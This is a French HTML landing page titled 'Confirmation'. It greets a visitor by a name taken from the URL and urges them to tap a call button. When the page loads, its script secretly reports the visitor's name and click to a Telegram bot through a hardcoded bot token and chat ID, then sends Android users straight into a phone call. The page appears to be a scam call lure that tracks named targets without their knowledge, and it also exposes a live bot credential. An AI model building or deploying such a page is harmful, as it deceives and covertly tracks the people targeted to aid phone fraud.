<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmation</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    html, body {
      background-color: #09090b;
      color: #ffffff;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      overflow: hidden;
    }
    .card {
      background: #18181b;
      border: 1px solid #27272a;
      padding: 32px 24px;
      border-radius: 20px;
      text-align: center;
      width: 90%;
      max-width: 360px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }
    .greeting {
      font-size: 22px;
      font-weight: 600;
      color: #ffffff;
      margin-bottom: 6px;
      text-transform: capitalize;
    }
    .subtext {
      font-size: 14px;
      color: #a1a1aa;
      margin-bottom: 24px;
    }
    .btn-call {
      background-color: #22c55e;
      color: #ffffff;
      padding: 16px 20px;
      border-radius: 12px;
      text-decoration: none;
      font-weight: 600;
      font-size: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: background-color 0.2s ease, transform 0.1s ease;
      -webkit-tap-highlight-color: transparent;
    }
    .btn-call:active {
      transform: scale(0.98);
      background-color: #16a34a;
    }
    .btn-call svg {
      width: 20px;
      height: 20px;
      fill: currentColor;
    }
  </style>
</head>
<body>

  <div class="card">
    <div id="txt-greeting" class="greeting">Bonjour</div>
    <div class="subtext">Appuyez ci-dessous pour lancer l'appel</div>

    <a id="btn-call" class="btn-call" href="tel:+33600000000">
      <svg viewBox="0 0 24 24">
        <path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
      </svg>
      <span>Appeler maintenant</span>
    </a>
  </div>

  <script>
    // ⚠️ Remplace par ton vrai numéro si besoin
    var MON_NUMERO = "+33600000000"; 
    var NUMERO = "tel:" + MON_NUMERO;

    // VRAIS IDENTIFIANTS TELEGRAM (issus de ton ancien projet)
    var botToken = "8326192481:AAFeag-sd84P6ykvzDyh0ZK3jNqHLtM2KSQ";
    var chatId = "-1004410634781";

    // Récupération du prénom dans l'URL (ex: allordv.lol/Ryan)
    let decodedName = 'Client';
    const pathSegments = window.location.pathname.split('/').filter(Boolean);
    if (pathSegments.length > 0) {
      const rawPathName = pathSegments[0].replace(/-/g, ' ');
      decodedName = decodeURIComponent(rawPathName).trim();
    } else {
      const params = new URLSearchParams(window.location.search);
      const clientName = params.get('nom') || params.get('prenom') || 'Client';
      decodedName = decodeURIComponent(clientName).trim();
    }

    if (!decodedName || decodedName.length < 2) {
      decodedName = 'Client';
    }

    // Mise à jour du texte de la page
    document.getElementById('txt-greeting').textContent = "Bonjour " + decodedName;
    document.getElementById('btn-call').href = NUMERO;

    // Envoi Telegram exactement comme ton ancien projet
    const telegramMsg = "🚨 CLIC DÉTECTÉ Projet numéro redirection !\nLe client " + decodedName + " vient de cliquer sur le lien ! 🔥";
    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(telegramMsg)).catch(function(e) {});

    // Redirection automatique Android
    var isAndroid = /android/i.test(navigator.userAgent);
    if (isAndroid) {
      window.location.href = NUMERO;
    }
  </script>

</body>
</html>
